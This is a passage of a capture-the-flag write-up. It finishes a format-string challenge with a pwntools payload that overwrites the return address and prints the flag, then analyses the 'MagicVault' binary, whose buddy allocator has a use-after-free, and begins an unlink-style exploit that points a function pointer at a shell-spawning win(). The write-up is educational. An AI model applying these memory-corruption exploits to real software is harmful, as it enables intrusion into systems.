+    <blockquote class="alert alert-note">
+        <p class="alert-heading">
+            ℹ️
+            <b>
+                
+                    Note
+                
+            </b>
+        </p>
+        <p>You need to write the address of <code>buffer</code> (and specifically in this case, which offset of buffer) somewhere on the stack.</p>
+    </blockquote>
+<figure>
+    <img src="assets/fsw_3.png">
+    <figcaption>Our command has successfully been written to `buffer`</figcaption>
+</figure>
+<p>Finally, let’s overwrite rip to <code>win()</code> (remember PIE exists!). The flag will print out.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># overwrite last 2 bytes of rip to win, accounting for pie</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;first name&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">win_val</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">win</span><span class="p">)[:</span><span class="mi">2</span><span class="p">],</span> <span class="n">byteorder</span><span class="o">=</span><span class="s1">&#39;little&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;%&#39;</span> <span class="o">+</span> <span class="n">win_val</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;x%7$hn&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></div><p>Flag: <code>Breach{5h0uldv3_l1573n3d_70_7h3_6cc_w4rn1n65}</code></p>
+<h2 id="pwnmagicvault">pwn/MagicVault</h2>
+<p>I quite enjoy this challenge, for while it is conceptually simple, it was well disguised within a unique context compared to a typical CRUD binary.</p>
+<h3 id="analysis">Analysis</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">ctfplayer@enxgmatic:~/breachers/magicvault$ checksec main
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/ctfplayer/breachers/magicvault/main&#39;</span>
+</span></span><span class="line"><span class="cl">    Arch:     amd64-64-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    Canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+</span></span></code></pre></div><p>Apart from the binary, we are given 3 files: <code>magic_buddy.c</code>, <code>magic_buddy.h</code> and <code>main.c</code>.</p>
+<h3 id="analysis---magic_buddy">Analysis - magic_buddy</h3>
+<p><code>magic_buddy</code> is an implementation of the buddy memory allocation system. It splits memory into halves to determine the best fit i.e. it uses the memory block size 2<sup>m</sup> which satisfies 2<sup>m-1</sup> &lt; requested size &lt;= 2<sup>m</sup>.</p>
+<p>No deep knowledge about the buddy system is actually needed, and most of the code in it is irrelevant to the exploit.</p>
+<p>To give a brief overview, <code>init_buddy</code> initialises the buddy memory allocator, which is of the following struct. It includes an array of pointers to freed blocks (<code>avail</code>), the starting memory address where blocks will be allocated to (<code>base</code>), and its largest block size (<code>root_logsize</code>).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define MAGIC_COOKIE_BYTES 32
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define ADDRESS_BITS (8 * sizeof(void *))
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">buddy</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint8_t</span> <span class="n">magic</span><span class="p">[</span><span class="n">MAGIC_COOKIE_BYTES</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">free_block</span> <span class="o">*</span><span class="p">(</span><span class="n">avail</span><span class="p">[</span><span class="n">ADDRESS_BITS</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">root_logsize</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="o">*</span><span class="n">base</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span></code></pre></div><p>The <code>allocate</code> and <code>liberate</code> functions are similar to that of <code>malloc()</code> and <code>free()</code> respectively.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// Allocate a block of size &gt;= @size
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="o">*</span><span class="nf">allocate</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="k">struct</span> <span class="n">buddy</span> <span class="o">*</span><span class="n">state</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Liberate a block of size @size starting at @base.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="nf">liberate</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">base</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="k">struct</span> <span class="n">buddy</span> <span class="o">*</span><span class="n">state</span><span class="p">);</span>
+</span></span></code></pre></div><p>Each freed memory block is represented by the following struct. With both <code>next</code> and <code>pprev</code> pointers, this is a doubly linked list, similar to that of e.g. a small bin. The <code>magic</code> value is 32 random bytes to verify that a block is indeed freed. <code>logsize</code> is the size of the freed block.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">free_block</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">free_block</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">free_block</span> <span class="o">**</span><span class="n">pprev</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint8_t</span> <span class="n">magic</span><span class="p">[</span><span class="n">MAGIC_COOKIE_BYTES</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint8_t</span> <span class="n">logsize</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span></code></pre></div><h3 id="analysis---main">Analysis - main</h3>
+<p>Now, let’s check out <code>main.c</code>. The initialising function, <code>init_app()</code>, is below.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define POOL_SIZE 1024
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define CHUNK_SIZE 0x80
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">buddy</span> <span class="n">state</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">uint8_t</span> <span class="n">pool</span><span class="p">[</span><span class="n">POOL_SIZE</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="n">vault</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">fp</span><span class="p">)()</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">safe_notify</span><span class="p">()</span> <span class="p">{</span> <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Notification: Your vault is secure.&#34;</span><span class="p">);</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">win</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Access granted! Spawning shell...&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="o">*</span><span class="n">vault_functions</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">init_app</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    <span class="c1">// initialise vault_functions
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">vault_functions</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">win</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">vault_functions</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">safe_notify</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// value of fp is the pointer to safe_notify
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">fp</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">vault_functions</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// randomly generate magic cookie bytes (used in magic_buddy)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint8_t</span> <span class="n">magic</span><span class="p">[</span><span class="n">MAGIC_COOKIE_BYTES</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">getrandom</span><span class="p">(</span><span class="n">magic</span><span class="p">,</span> <span class="n">MAGIC_COOKIE_BYTES</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">!=</span> <span class="n">MAGIC_COOKIE_BYTES</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;getrandom&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// initialises a buddy (via magic_buddy)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">init_buddy</span><span class="p">(</span><span class="n">pool</span><span class="p">,</span> <span class="n">POOL_SIZE</span><span class="p">,</span> <span class="n">magic</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">state</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>In <code>main()</code>, the binary has a CRUD-like menu of options.</p>
+<p><strong>Option 1</strong>. <code>create_vault</code>: allocates a new block, allowing us to write to it. The <code>allocate()</code> function is similar to <code>malloc()</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">create_vault</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// checks vault is empty, i.e. no block has been allocated
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="n">vault</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Vault entry already exists!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// allocate a block
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">vault</span> <span class="o">=</span> <span class="nf">allocate</span><span class="p">(</span><span class="n">CHUNK_SIZE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">state</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">vault</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Allocation failed.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// get input, write to block
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter your vault note (max %d bytes): &#34;</span><span class="p">,</span> <span class="n">CHUNK_SIZE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">vault</span><span class="p">,</span> <span class="n">CHUNK_SIZE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><strong>Option 2</strong>. <code>edit_vault</code>: edits the value of the block</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">edit_vault</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">vault</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;No vault entry exists!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter new vault note (max %d bytes): &#34;</span><span class="p">,</span> <span class="n">CHUNK_SIZE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">vault</span><span class="p">,</span> <span class="n">CHUNK_SIZE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><strong>Option 3</strong>. <code>delete_vault</code>: liberates the block. However, the vault entry is not cleared afterwards. This means we have a use-after-free (UAF) primitive.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">delete_vault</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">vault</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;No vault entry exists!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Deleting your vault entry...&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">liberate</span><span class="p">(</span><span class="n">vault</span><span class="p">,</span> <span class="n">CHUNK_SIZE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">state</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// vault is not nullified =&gt; UAF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span></code></pre></div><p><strong>Option 4</strong>. <code>allocate_new_vault()</code>: allocates a new block, however we cannot directly write to it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">allocate_new_vault</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">vault</span> <span class="o">=</span> <span class="nf">allocate</span><span class="p">(</span><span class="n">CHUNK_SIZE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">state</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">vault</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Allocation failed.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;New vault entry allocated at: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">vault</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><strong>Option 5</strong>:. <code>send_notification</code>: typically, this will run <code>safe_notify()</code>. As such, our goal will be to overwrite <code>fp</code> to <code>&amp;vault_functions[0]</code>, aka the pointer to <code>win()</code>. Then, choosing this option will give us a shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">send_notification</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">fp2</span><span class="p">)()</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="n">fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Sending notification...&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fp2</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="exploit-1">Exploit</h3>
+<p>Since there is UAF, let’s check out <code>allocate()</code> and see what values in the freed block we can change to get arb write.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="o">*</span><span class="nf">_allocate</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">logsize</span><span class="p">,</span> <span class="k">struct</span> <span class="n">buddy</span> <span class="o">*</span><span class="n">state</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">logsize</span> <span class="o">&gt;</span> <span class="n">state</span><span class="o">-&gt;</span><span class="n">root_logsize</span><span class="p">)</span> <span class="c1">// check if requested size is too large
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">avail</span><span class="p">[</span><span class="n">logsize</span><span class="p">])</span> <span class="p">{</span> <span class="c1">// check if there is an existing freed block of the correct size that can be used instead
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">struct</span> <span class="n">free_block</span> <span class="o">*</span><span class="n">block</span> <span class="o">=</span> <span class="nf">pop</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">avail</span><span class="p">[</span><span class="n">logsize</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">memset</span><span class="p">(</span><span class="n">block</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">free_block</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">block</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">logsize</span> <span class="o">==</span> <span class="n">state</span><span class="o">-&gt;</span><span class="n">root_logsize</span><span class="p">)</span> <span class="c1">// check if requested size is too large
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">free_block</span> <span class="o">*</span><span class="n">parent</span> <span class="o">=</span> <span class="nf">_allocate</span><span class="p">(</span><span class="n">logsize</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">state</span><span class="p">);</span> <span class="c1">// allocate a parent block
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">parent</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">free_block</span> <span class="o">*</span><span class="n">buddy</span> <span class="o">=</span> <span class="nf">buddy_of</span><span class="p">(</span><span class="n">parent</span><span class="p">,</span> <span class="n">logsize</span><span class="p">,</span> <span class="n">state</span><span class="p">);</span> <span class="c1">// get buddy of parent
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// split @parent in half and place the buddy on the avail list.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">memcpy</span><span class="p">(</span><span class="n">buddy</span><span class="o">-&gt;</span><span class="n">magic</span><span class="p">,</span> <span class="n">state</span><span class="o">-&gt;</span><span class="n">magic</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">magic</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">push</span><span class="p">(</span><span class="n">buddy</span><span class="p">,</span> <span class="n">logsize</span><span class="p">,</span> <span class="n">state</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">parent</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="o">*</span><span class="nf">allocate</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="k">struct</span> <span class="n">buddy</span> <span class="o">*</span><span class="n">state</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">size</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">free_block</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">free_block</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">_allocate</span><span class="p">(</span><span class="nf">size2log</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span> <span class="n">state</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Particularly, <code>pop()</code> removes the block from the doubly linked list. This is functionally the same as the unlink mechanism in glibc heap. It writes the value of <code>block-&gt;next</code> to the address given by <code>block-&gt;pprev</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="k">struct</span> <span class="n">free_block</span> <span class="o">*</span><span class="nf">pop</span><span class="p">(</span><span class="k">struct</span> <span class="n">free_block</span> <span class="o">*</span><span class="n">block</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// writes the value of block-&gt;next to the address given by block-&gt;pprev
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">*</span><span class="p">(</span><span class="n">block</span><span class="o">-&gt;</span><span class="n">pprev</span><span class="p">)</span> <span class="o">=</span> <span class="n">block</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">block</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// writes the value of block-&gt;pprev at a 8 byte offset to the address given by block-&gt;next
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">block</span><span class="o">-&gt;</span><span class="n">next</span><span class="o">-&gt;</span><span class="n">pprev</span> <span class="o">=</span> <span class="n">block</span><span class="o">-&gt;</span><span class="n">pprev</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">block</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>So, we could effectively perform an unlink exploit, editing the values of the <code>next</code> and <code>pprev</code> in order to get arb write. However, we can only write a maximum of 16 bytes, else we would edit <code>magic</code>, causing the block to be considered invalid.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// interpret @block as a block at depth @logsize. is it free?
+</span></span></span><span class="line"><span class="cl"><span class="c1">// block-&gt;magic needs to be equal to state-&gt;magic
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">static</span> <span class="kt">int</span> <span class="nf">isfree</span><span class="p">(</span><span class="k">struct</span> <span class="n">free_block</span> <span class="o">*</span><span class="n">block</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">logsize</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                  <span class="k">struct</span> <span class="n">buddy</span> <span class="o">*</span><span class="n">state</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">!</span><span class="nf">memcmp</span><span class="p">(</span><span class="n">block</span><span class="o">-&gt;</span><span class="n">magic</span><span class="p">,</span> <span class="n">state</span><span class="o">-&gt;</span><span class="n">magic</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">state</span><span class="o">-&gt;</span><span class="n">magic</span><span class="p">))</span> <span class="o">&amp;&amp;</span>
+</span></span><span class="line"><span class="cl">           <span class="n">block</span><span class="o">-&gt;</span><span class="n">logsize</span> <span class="o">==</span> <span class="n">logsize</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><figure>
+    <img src="assets/vault_1.png">
+    <figcaption>(top) the current state of the freed block
+    (bottom) the current state of fp & vault_functions</figcaption>
+</figure>
+<p>We want to overwrite <code>fp</code> (of address <code>0x405708</code>) to <code>0x405710</code> (the address of <code>vault_functions[0]</code>, aka a pointer to <code>win()</code>).</p>
+<p>To do that, we can take advtange of the line <code>*(block-&gt;pprev) = block-&gt;next;</code> in <code>pop()</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># create_vault()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Your choice:&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;dsds&#39;</span> <span class="c1">#any garbage value</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># delete the vault, there is UAF</span>
